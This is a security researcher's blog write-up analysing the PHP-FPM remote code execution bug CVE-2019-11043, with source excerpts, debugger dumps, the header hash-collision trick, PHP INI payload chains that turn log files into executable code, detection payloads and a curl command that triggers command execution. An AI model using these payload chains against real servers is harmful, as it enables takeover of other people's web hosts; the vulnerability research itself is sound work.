---
source: orange-tsai
source_url: https://blog.orange.tw/posts/2019-10-an-analysis-and-thought-about-recently/
title: "An analysis and thought about recently PHP-FPM RCE (CVE-2019-11043) | Orange Tsai"
author: "Orange Tsai"
published: 2019-10-29T16:00:00.000Z
description: "First of all, this is such a really interesting bug! From a small memory defect to code execution. It combines both binary and web technique so that’s why it interested me to trace into. This is just"
---

* * *

First of all, this is such a really interesting bug! From a small memory defect to code execution. It combines both binary and web technique so that’s why it interested me to trace into. This is just a simple analysis, you can also check the [bug report](https://bugs.php.net/bug.php?id=78599) and the author [neex’s exploit](https://github.com/neex/phuip-fpizdam) to know the original story :D

Originally, this write-up should be published earlier, but I am now traveling and don’t have enough time. Sorry for the delay :(

# [The root cause](https://blog.orange.tw/posts/2019-10-an-analysis-and-thought-about-recently/\#The-root-cause "The root cause") The root cause

PHP-FPM wrongly handles the `PATH_INFO`, which leads to a buffer underflow. Although it’s not vulnerable by default, there are still numerous vulnerable configurations that sysadmins would copy & paste from Google and StackOverflow.

When the `fastcgi_split_path_info` directive is parsing a URI with newline, the `env_path_info` becomes an empty value. And due to the `cgi.fix_pathinfo`, the empty value is [used(fpm\_main.c#L1151)](https://github.com/php/php-src/blob/php-7.3.10/sapi/fpm/fpm/fpm_main.c#L1151) to calculate the real `path_info` later.

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>``` | ```<br>int ptlen = strlen(pt);<br>int slen = len - ptlen;<br>int pilen = env_path_info ? strlen(env_path_info) : 0;<br>int tflag = 0;<br>char *path_info;<br>if (apache_was_here) {<br>    /* recall that PATH_INFO won't exist */<br>    path_info = script_path_translated + ptlen;<br>    tflag = (slen != 0 && (!orig_path_info || strcmp(orig_path_info, path_info) != 0));<br>} else {<br>    path_info = env_path_info ? env_path_info + pilen - slen : NULL;<br>    tflag = (orig_path_info != path_info);<br>}<br>``` |

Please note that the `pilen` is zero and `slen` is the original `URI` length minus the real file-path length, so there is a buffer underflow. `path_info` can point to somewhere before it should be.

# [The exploitation](https://blog.orange.tw/posts/2019-10-an-analysis-and-thought-about-recently/\#The-exploitation "The exploitation") The exploitation

With this buffer underflow, we have a limited(and small) buffer access. What can we do? The author leverages the [fpm\_main.c#L1161](https://github.com/php/php-src/blob/php-7.3.10/sapi/fpm/fpm/fpm_main.c#L1161) to do further actions.

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>path_info[0] = 0;<br>``` |

As the `path_info` points ahead of `PATH_INFO`, we can write a single null-byte to the position before `path_info`.

## [A. From null-byte writing to CGI environment overwritten](https://blog.orange.tw/posts/2019-10-an-analysis-and-thought-about-recently/\#A-From-null-byte-writing-to-CGI-environment-overwritten "A. From null-byte writing to CGI environment overwritten") A. From null-byte writing to CGI environment overwritten

OK, now we can write a single null-byte to somewhere before `PATH_INFO`, and then? In PHP-FPM, the CGI environments are stored in [`fcgi_data_seg` structure](https://github.com/php/php-src/blob/php-7.3.10/main/fastcgi.c#L188), and managed by [structure `fcgi_hash`](https://github.com/php/php-src/blob/php-7.3.10/main/fastcgi.c#L195).

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>``` | ```<br>typedef struct _fcgi_data_seg {<br>    char                  *pos;<br>    char                  *end;<br>    struct _fcgi_data_seg *next;<br>    char                   data[1];<br>} fcgi_data_seg;<br>typedef struct _fcgi_hash {<br>    fcgi_hash_bucket  *hash_table[FCGI_HASH_TABLE_SIZE];<br>    fcgi_hash_bucket  *list;<br>    fcgi_hash_buckets *buckets;<br>    fcgi_data_seg     *data;<br>} fcgi_hash;<br>``` |

The `fcgi_data_seg` in memory looks like:

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>``` | ```<br>gdb-peda$ p *request.env.data<br>$3 = {<br>  pos = 0x556578555537 "7UUxeU",<br>  end = 0x5565785564d8 "",<br>  next = 0x556578554490,<br>  data = "P"<br>}<br>gdb-peda$ x/50s request.env.data.data<br>0x5565785544a8: "FCGI_ROLE"<br>0x5565785544b2: "RESPONDER"<br>0x5565785544bc: "SCRIPT_FILENAME"<br>0x5565785544cc: "/var/www/html/test.php"<br>0x5565785544e3: "QUERY_STRING"<br>0x5565785544f0: ""<br>0x5565785544f1: "REQUEST_METHOD"<br>0x556578554500: "GET"<br>...<br>0x556578554656: "SERVER_NAME"<br>0x556578554662: "_"<br>0x556578554664: "REDIRECT_STATUS"<br>0x556578554674: "200"<br>0x556578554678: "PATH_INFO"<br>0x556578554682: "/", 'a' <repeats 13 times>, ".php"    <--- the `path_info` points to<br>0x556578554695: "HTTP_HOST"<br>0x55657855469f: "127.0.0.1"<br>``` |

The structure member `fcgi_data_seg->pos` points to the current buffer - `fcgi_data_seg->data` to let PHP-FPM know where to write, and `fcgi_data_seg->end` points to the buffer end. If the buffer reaches the end(`pos > end`). PHP-FPM creates a new buffer and moves the previous one to the structure member `fcgi_data_seg->next`.

So, the idea is to make `path_info` points to the location of `fcgi_data_seg->pos`. Once we achieve that, we can abuse the CGI environment management! For example, here we adjust the `path_info` points to the `fcgi_data_seg->pos`.

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>``` | ```<br>gdb-peda$ frame<br>#0  init_request_info () at /home/orange/php-src/sapi/fpm/fpm/fpm_main.c:1161<br>1161                         path_info[0] = 0;<br>gdb-peda$ x/xg path_info<br>0x5565785554c0: 0x0000556578555537<br>gdb-peda$ x/g request.env.data<br>0x5565785554c0: 0x0000556578555537<br>gdb-peda$ p (fcgi_data_seg)*request.env.data<br>$2 = {<br>  pos = 0x556578555537 "",<br>  end = 0x5565785564d8 "",<br>  next = 0x556578554490,<br>  data = "P"<br>}<br>gdb-peda$ x/15s (char **)request.env.data.data<br>0x5565785554d8: "PATH_INFO"<br>0x5565785554e2: ""<br>0x5565785554e3: "HTTP_HOST"<br>0x5565785554ed: "127.0.0.1"<br>0x5565785554f7: "HTTP_ACCEPT_ENCODING"<br>0x55657855550c: 'A' <repeats 11 times><br>0x556578555518: "HTTP_LAYS"<br>0x556578555522: "NOGG"<br>0x556578555527: "ORIG_PATH_INFO"<br>0x556578555536: ""<br>0x556578555537: ""                           <--- the original `request.env.data.pos`<br>0x556578555538: ""<br>0x556578555539: ""<br>0x55657855553a: ""<br>0x55657855553b: ""<br>``` |

This is the memory layout of `request.env.data`.

![](https://blog.orange.tw/posts/2019-10-an-analysis-and-thought-about-recently/25ed41355c5c976b-02.png)

Once the line `path_info[0] = 0;` has been executed, the memory layout becomes:

![](https://blog.orange.tw/posts/2019-10-an-analysis-and-thought-about-recently/630b35c33f200b20-03.png)

As the `request.env.data.pos` has been written, and changed to a new location:

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>``` | ```<br>gdb-peda$ next<br>...<br>gdb-peda$ p (fcgi_data_seg)*request.env.data<br>$4 = {<br>  pos = 0x556578555500 "PT_ENCODING",<br>  end = 0x5565785564d8 "",<br>  next = 0x556578554490,<br>  data = "P"<br>}<br>gdb-peda$ x/10s (char **)request.env.data.pos<br>0x556578555500: "PT_ENCODING"<br>0x55657855550c: 'A' <repeats 11 times><br>0x556578555518: "HTTP_LAYS"<br>0x556578555522: "NOGG"<br>0x556578555527: "ORIG_PATH_INFO"<br>0x556578555536: ""<br>0x556578555537: ""<br>0x556578555538: ""<br>0x556578555539: ""<br>0x55657855553a: ""<br>``` |

As you can see, the `request.env.data.pos` is shifted to the middle of an environment variable. The next time PHP-FPM [put a new CGI environment](https://github.com/php/php-src/blob/php-7.3.10/main/fastcgi.c#L1694), it will overwrite the existing one.

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>``` | ```<br>#define FCGI_PUTENV(request, name, value) \<br> fcgi_quick_putenv(request, name, sizeof(name)-1, FCGI_HASH_FUNC(name, sizeof(name)-1), value)<br>char* fcgi_putenv(fcgi_request *req, char* var, int var_len, char* val)<br>{<br> if (!req) return NULL;<br> if (val == NULL) {<br>  fcgi_hash_del(&req->env, FCGI_HASH_FUNC(var, var_len), var, var_len);<br>  return NULL;<br> } else {<br>  return fcgi_hash_set(&req->env, FCGI_HASH_FUNC(var, var_len), var, var_len, val, (unsigned int)strlen(val));<br> }<br>}<br>static char* fcgi_hash_set(fcgi_hash *h, unsigned int hash_value, char *var, unsigned int var_len, char *val, unsigned int val_len)<br>{<br>    unsigned int      idx = hash_value & FCGI_HASH_TABLE_MASK;<br>    fcgi_hash_bucket *p = h->hash_table[idx];<br>    // ...<br>    p->var = fcgi_hash_strndup(h, var, var_len);<br>    p->val_len = val_len;<br>    p->val = fcgi_hash_strndup(h, val, val_len);<br>    return p->val;<br>}<br>static inline char* fcgi_hash_strndup(fcgi_hash *h, char *str, unsigned int str_len)<br>{<br>    char *ret;<br>    // ...<br>    ret = h->data->pos;                             <--- we have corrupted the `pos` :D<br>    memcpy(ret, str, str_len);<br>    ret[str_len] = 0;<br>    h->data->pos += str_len + 1;<br>    return ret;<br>}<br>``` |

And it’s lucky, there is a `FCGI_PUTENV` [right after](https://github.com/php/php-src/blob/php-7.3.10/sapi/fpm/fpm/fpm_main.c#L1165) the null-byte writing:

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>``` | ```<br>old = path_info[0];<br>path_info[0] = 0;<br>if (!orig_script_name ||<br>    strcmp(orig_script_name, env_path_info) != 0) {<br>    if (orig_script_name) {<br>        FCGI_PUTENV(request, "ORIG_SCRIPT_NAME", orig_script_name);        <--- here<br>    }<br>    SG(request_info).request_uri = FCGI_PUTENV(request, "SCRIPT_NAME", env_path_info);<br>} else {<br>    SG(request_info).request_uri = orig_script_name;<br>}<br>path_info[0] = old;<br>``` |

It puts the name `ORIG_SCRIPT_NAME` and our controllable value into the CGI environments so that we can overwrite some important environments! …and then?

## [B. From CGI environment overwritten to Remote Code Execution](https://blog.orange.tw/posts/2019-10-an-analysis-and-thought-about-recently/\#B-From-CGI-environment-overwritten-to-Remote-Code-Execution "B. From CGI environment overwritten to Remote Code Execution") B. From CGI environment overwritten to Remote Code Execution

Now we can overwrite environments, how to turn it into the RCE?

After the null-byte writing, the PHP-FPM [retrieves the environment `PHP_VALUE`](https://github.com/php/php-src/blob/php-7.3.10/sapi/fpm/fpm/fpm_main.c#L1336) to initial the PHP stuff. So that’s our target!

However, although we can overwrite the environment data. To forge the `PHP_VALUE` is still not easy. We can not just overwrite the existing environments key to `PHP_VALUE` and profit. After checking the source, we found the problem is PHP-FPM uses a hash table to manage environments. Without corrupting the table, we can’t insert a new environment!

PHP-FPM stores each environment variable in [structure `fcgi_hash_bucket`](https://github.com/php/php-src/blob/php-7.3.10/main/fastcgi.c#L172).

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>``` | ```<br>typedef struct _fcgi_hash_bucket {<br>    unsigned int              hash_value;<br>    unsigned int              var_len;<br>    char                     *var;<br>    unsigned int              val_len;<br>    char                     *val;<br>    struct _fcgi_hash_bucket *next;<br>    struct _fcgi_hash_bucket *list_next;<br>} fcgi_hash_bucket;<br>``` |

There are also [some checks](https://github.com/php/php-src/blob/php-7.3.10/main/fastcgi.c#L392) before PHP-FPM retrieve the environment variable:

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>``` | ```<br>static char *fcgi_hash_get(fcgi_hash *h, unsigned int hash_value, char *var, unsigned int var_len, unsigned int *val_len)<br>{<br>    unsigned int      idx = hash_value & FCGI_HASH_TABLE_MASK;<br>    fcgi_hash_bucket *p = h->hash_table[idx];<br>    while (p != NULL) {<br>        if (p->hash_value == hash_value &&<br>            p->var_len == var_len &&<br>            memcmp(p->var, var, var_len) == 0) {<br>            *val_len = p->val_len;<br>            return p->val;<br>        }<br>        p = p->next;<br>    }<br>    return NULL;<br>}<br>``` |

PHP-FPM first retrieves the environment structure from the hash table, and then check the `hash_value`, `var_len` and content. We can forge the content, but how to forge the `hash_value` and `var_len`? OK, let’s do it!

The [hash algorithm](https://github.com/php/php-src/blob/php-7.3.10/main/fastcgi.h#L31) in PHP-FPM is simple.

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>``` | ```<br>#define FCGI_HASH_FUNC(var, var_len) \<br>    (UNEXPECTED(var_len < 3) ? (unsigned int)var_len : \<br>        (((unsigned int)var[3]) << 2) + \<br>        (((unsigned int)var[var_len-2]) << 4) + \<br>        (((unsigned int)var[var_len-1]) << 2) + \<br>        var_len)<br>``` |

For the `PHP_VALUE`, its hash value is `('_'<<2) + ('U'<<4) + ('E'<<) + 9 = 2015`. The author sends a HTTP header `HTTP_EBUT`, and its hash value is `('P'<<2) + ('U'<<4) + ('T'<<2) + 9 = 2015`. The fake header has been stored in the hash table. Once we trigger the vulnerability and overwrite the `HTTP_EBUT` to `PHP_VALUE`, the forged one becomes valid! Both variables have the same `hash_value` and `var_len`, and now, they have the same key content!

We can create arbitrary `PHP_VALUE` now. To get code execution seems easy! The author create a series of PHP INI chains to get code execution.

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>``` | ```<br>var chain = []string{<br>    "short_open_tag=1",<br>    "html_errors=0",<br>    "include_path=/tmp",<br>    "auto_prepend_file=a",<br>    "log_errors=1",<br>    "error_reporting=2",<br>    "error_log=/tmp/a",<br>    "extension_dir=\"<?=`\"",<br>    "extension=\"$_GET[a]`?>\"",<br>}<br>``` |

# [Write a working exploit](https://blog.orange.tw/posts/2019-10-an-analysis-and-thought-about-recently/\#Write-a-working-exploit "Write a working exploit") Write a working exploit

OK, here we have all the details. However, it’s still hard to write the exploit. Although our steps are straightforward, there are still several obstacles making the exploit unstable and unexploitable… :(

## [A. The Nginx obstacle](https://blog.orange.tw/posts/2019-10-an-analysis-and-thought-about-recently/\#A-The-Nginx-obstacle "A. The Nginx obstacle") A. The Nginx obstacle

The first obstacle is the Nginx configuration. As the PHP is an independent package from Nginx. To make the Nginx handle PHP scripts, there are many settings required in the configuration. Here we classified the configurations into 4 aspect.

1. Is `PATH_INFO` supported? Because `PATH_INFO` is not a necessary feature. If there is no `fastcgi_param PATH_INFO $blah;` in Nginx configuration, you are safe!

2. The PHP dispatcher - In order to dispatch requests to PHP-FPM. Sysadmin must set a regular expression to match the URI. There are several ways to capture that, and the most common two situations are:

1. The setting from [Nginx official manual](https://www.nginx.com/resources/wiki/start/topics/examples/phpfcgi/)

      |     |     |
      | --- | --- |
      | ```<br>1<br>2<br>3<br>``` | ```<br>location ~ [^/]\.php(/|$) {<br>    # ...<br>}<br>``` |

2. The default Nginx configuration snippet on current Linux dists

      |     |     |
      | --- | --- |
      | ```<br>1<br>2<br>3<br>``` | ```<br>location ~ \.php$ {<br>    # ...<br>}<br>``` |


       Both two ways are very common in the world. Although the meaning looks like the same, the exploitation is absolutely different! We will introduce this in next section.
3. Is the file existed?

    The default Nginx configuration checks the file existence before sending it to PHP-FPM. You may see the following configuration:


|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>``` | ```<br>location ~ [^/]\.php(/|$) {<br>    fastcgi_split_path_info ^(.+?\.php)(/.*)$;<br>    if (!-f $document_root$fastcgi_script_name) {<br>        return 404;<br>    }<br>}<br>``` |


    or


|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>``` | ```<br>location ~ \.php$ {<br>    fastcgi_split_path_info ^(.+\.php)(/.+)$;<br>    try_files $fastcgi_script_name =404;<br>}<br>``` |


    However, it’s still possible to be removed due to scalability or performance issues. For example, just imagine Nginx and PHP-FPM are not on the same server!

4. The `PATH_INFO` sequential problem

    From the [neex’s exploit](https://github.com/neex/phuip-fpizdam/blob/master/requester.go#L65), he adjust the buffer by increasing the length of `QUERY_STRING`. But what if the `PATH_INFO` comes before the `QUERY_STRING`? You can not control the `PATH_INFO` to the region you want. Actually, in my default installed Nginx on Ubuntu 18.04 and 16.04. The configuration looks like this:


|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>``` | ```<br># ------------------------------------<br># /etc/nginx/sites-enabled/nginx.conf <br>location ~ \.php$ {<br>      include snippets/fastcgi-php.conf;<br>      # With php7.0-cgi alone:<br>      fastcgi_pass 127.0.0.1:9000;<br>      # With php7.0-fpm:<br>      fastcgi_pass unix:/run/php/php7.0-fpm.sock;<br>}<br># ------------------------------------<br># /etc/nginx/snippets/fastcgi-php.conf<br># regex to split $uri to $fastcgi_script_name and $fastcgi_path<br>fastcgi_split_path_info ^(.+\.php)(/.+)$;<br># Check that the PHP script exists before passing it<br>try_files $fastcgi_script_name =404;<br># Bypass the fact that try_files resets $fastcgi_path_info<br># see: http://trac.nginx.org/nginx/ticket/321<br>set $path_info $fastcgi_path_info;<br>fastcgi_param PATH_INFO $path_info;<br>fastcgi_index index.php;<br>include fastcgi.conf;<br># ------------------------------------<br># /etc/nginx/fastcgi.conf<br>fastcgi_param  SCRIPT_FILENAME    $document_root$fastcgi_script_name;<br>fastcgi_param  QUERY_STRING       $query_string;<br>fastcgi_param  REQUEST_METHOD     $request_method;<br>fastcgi_param  CONTENT_TYPE       $content_type;<br>fastcgi_param  CONTENT_LENGTH     $content_length;<br># ...<br>``` |


    As you can see, the `PATH_INFO` are defined before the `QUERY_STRING`, so the original exploit doesn’t cover that. That’s also the reason why I trace into this bug!


So, the Nginx configuration greatly affects this vulnerability. For the obstacle No.1 and No.3, it’s hopeless and unexploitable. About how to improve obstacle No.2 and No.4, we leave it for the last section!

However, a fun fact is that if you install the Nginx and PHP-FPM on Ubuntu(16.04/18.04) thought the `apt` package manager. You can remove just one line(`try_files`) and make your service vulnerable :P

## [B. Vulnerability verification problem](https://blog.orange.tw/posts/2019-10-an-analysis-and-thought-about-recently/\#B-Vulnerability-verification-problem "B. Vulnerability verification problem") B. Vulnerability verification problem

Before exploiting the target, we need to check if the target is vulnerable or not. Because the remote Nginx configuration is unknown, we need to find a reliable way to trigger the environment overwrite. Here the author leverage the double buffer mechanism!

As I mentioned before:

> If the buffer reaches the end(pos > end). PHP-FPM creates a new buffer and put the previous one to the structure member fcgi\_data\_seg->next.

The neex’s exploit enlarges the `QUERY_STRING` to force PHP-FPM allocate a new buffer and therefore place the `PATH_INFO` buffer at the right location. As long as the `PATH_INFO` is on the top of the new `fcgi_data_seg->data` buffer, we know the offset from the `PATH_INFO` to `fcgi_data_seg->pos` is 34.

We fixed our `PATH_INFO` length to 34 so that we can exactly place the null-byte in the right address. Due to the PHP-FPM implementation, the HTTP headers must be right after the `PATH_INFO`, and we can designed the context like:

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>``` | ```<br>gdb-peda$ x/10s request.env.data.data<br>0x55c8cc0e74d8: "PATH_INFO"<br>0x55c8cc0e74e2: ""<br>0x55c8cc0e74e3: "HTTP_HOST"<br>0x55c8cc0e74ed: "127.0.0.1"<br>0x55c8cc0e74f7: "HTTP_DUMMY_HEADERSSS"<br>0x55c8cc0e750c: 'A' <repeats 11 times><br>0x55c8cc0e7518: "HTTP_EBUT"<br>0x55c8cc0e7522: "NOGG"<br>0x55c8cc0e7527: "ORIG_PATH_INFO"<br>0x55c8cc0e7536: ""<br>gdb-peda$ x/6s request.env.data.pos<br>0x55c8cc0e7500: "Y_HEADERSSS"<br>0x55c8cc0e750c: 'A' <repeats 11 times><br>0x55c8cc0e7518: "HTTP_EBUT"<br>0x55c8cc0e7522: "NOGG"<br>0x55c8cc0e7527: "ORIG_PATH_INFO"<br>0x55c8cc0e7536: ""<br>``` |

We then adjust the length of `HTTP_DUMMY_HEADER` to exactly overwrite the `HTTP_EBUT` and its value to `PHP_VALUE\nsession.auto_start=1;;;`.

This is the memory view before the environment variable is written on [fpm\_main.c#1165](https://github.com/php/php-src/blob/php-7.3.10/sapi/fpm/fpm/fpm_main.c#L1165).

![](https://blog.orange.tw/posts/2019-10-an-analysis-and-thought-about-recently/ed531d0337d510c0-04.png)

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>``` | ```<br>gdb-peda$ p *request.env.buckets<br>...<br>{<br>      hash_value = 0x7e9,<br>      var_len = 0x9,<br>      var = 0x55c8cc0e7518 "HTTP_BBUT",<br>      val_len = 0x4,<br>      val = 0x55c8cc0e7522 "NOGG",<br>      next = 0x55c8cc0e4aa0,<br>      list_next = 0x55c8cc0e4c80<br>}<br>``` |

This is the memory view after the environment variable is written.

![](https://blog.orange.tw/posts/2019-10-an-analysis-and-thought-about-recently/b350faa64f87945d-05.png)

While the `session.auto_start` is changed to `1`, we can just check the `set-cookie` header in HTTP response to know whether our exploit succeeds or not!

## [C. The length limitation](https://blog.orange.tw/posts/2019-10-an-analysis-and-thought-about-recently/\#C-The-length-limitation "C. The length limitation") C. The length limitation

As we mentioned before, we fixed our `PATH_INFO` length to 34 so that we can exactly place the null-byte in the right address. The previous detect payload is good and short enough, and this is also the simplest detect method. It’s also the first situation in our `the PHP dispatcher` section.

However, in another scenario, the URI must end with `.php` so that our payload must be less than 34 bytes. Otherwise, if we plus the the `.php` suffix, the original detect payload will become 35 bytes…

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>PHP_VALUE\nsession.auto_start=1;.php<br>``` |

Due to the length limitation, most of the INI stuff are too long, and building a code execution chain becomes harder… :(

# [Improve the exploit](https://blog.orange.tw/posts/2019-10-an-analysis-and-thought-about-recently/\#Improve-the-exploit "Improve the exploit") Improve the exploit

After I had deeper understanding of this, I kept thinking if there is any way to improve the exploit.

## [A. The PATH_INFO sequential problem](https://blog.orange.tw/posts/2019-10-an-analysis-and-thought-about-recently/\#A-The-PATH-INFO-sequential-problem "A. The PATH_INFO sequential problem") A. The `PATH_INFO` sequential problem

It’s easy. Because the `PATH_INFO` is ahead of `QUERY_STRING`, and there are no `SCRIPT_FILENAME`, `SCRIPT_NAME` and `REQUEST_URI` to interfere our alignment. We can just pad on the `PATH_INFO` itself to enlarge the buffer!

## [B. How to detect the vulnerability](https://blog.orange.tw/posts/2019-10-an-analysis-and-thought-about-recently/\#B-How-to-detect-the-vulnerability "B. How to detect the vulnerability") B. How to detect the vulnerability

You can just put a single newline in the `PATH_INFO` and increase the PATH\_INFO and QUERY\_STRING length(depend on situations). If the PHP-FPM crashes, that means you got it :P

If there is a PHPINFO page. To detect the vulnerability is more easy, you can just fetch the /info.php/%0a.php and observe the $\_SERVER\[‘PATH\_INFO’\] is corrupted or not!

## [C. Bypass the length limitation](https://blog.orange.tw/posts/2019-10-an-analysis-and-thought-about-recently/\#C-Bypass-the-length-limitation "C. Bypass the length limitation") C. Bypass the length limitation

It’s not easy to bypass that. Due to the `.php` suffix, we have only two options. The first choice is building the payloads under constraint, and the other one is to bypass the constraint!

The first one is to build the payload under constraint. The [neex’s exploit](https://github.com/neex/phuip-fpizdam/pull/2/files) leverage [another CGI environment `REQUEST_BODY_FILE`](https://github.com/php/php-src/blob/php-7.3.10/sapi/fpm/fpm/fpm_main.c#L457) to control more bytes on error messages. This is genius!

My method is to leverage the `output_method` directive. Here is the RCE chain I built:

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>``` | ```<br>inis = [<br>    "error_reporting=2",<br>    "short_open_tag=1",<br>    "html_errors=0",<br>    "log_errors=1",<br>    "output_handler=<?/*",<br>    "output_handler=*/`",<br>    "output_handler=''",<br>    "extension_dir='`?>'",<br>    "extension=$_GET[a]",<br>    "error_log  = /tmp/l",<br>    "include_path=/tmp",<br>]<br>``` |

And the `/tmp/l.php` looks like:

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>``` | ```<br>[27-Oct-2019 13:55:05 UTC] PHP Warning:  Unknown: failed to open stream: No such file or directory in Unknown on line 0<br>[27-Oct-2019 13:55:05 UTC] PHP Warning:  Unknown: function '<?/*.php' not found or invalid function name in Unknown on line 0<br>[27-Oct-2019 13:55:05 UTC] PHP Warning:  Unknown: function '*/`' not found or invalid function name in Unknown on line 0<br>[27-Oct-2019 13:55:05 UTC] PHP Warning:  Unknown: Unable to load dynamic library '$_GET[a]' (tried: `?>.php/$_GET[a] (`?>.php/$_GET[a]: cannot open shared object file: No such file or directory), `?>.php/$_GET[a].so (`?>.php/$_GET[a].so: cannot open shared object file: No such file or directory)) in Unknown on line 0<br>``` |

We put a lot of garbage into the backtick, of course, including our `$_GET[a]`, so we can simply use the newline to execute arbitrary command.

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>curl "http://localhost/index.php?a=%0asleep+5%0a"<br>``` |

About the constraint bypass, my idea is to pop the previous environment onto the newly `fcgi_data_seg->data` buffer. In most Nginx configurations, the environment variable before `PATH_INFO` is usually `REDIRECT_STATUS=200`. So we can pop the string `200` onto the buffer and extend the controllable space size from `34` to `37` bytes! That’s enough to fit all payloads including the `.php` suffix! This idea works on my local environment, and I am now trying to make exploit more reliable :D

OK, this is whole the detail about the recently PHP-FPM 2019-11043. If you have any further idea for making the exploit more reliable and exploitable, please let me know and contribute back to [the original author’s GitHub repo](https://github.com/neex/phuip-fpizdam)!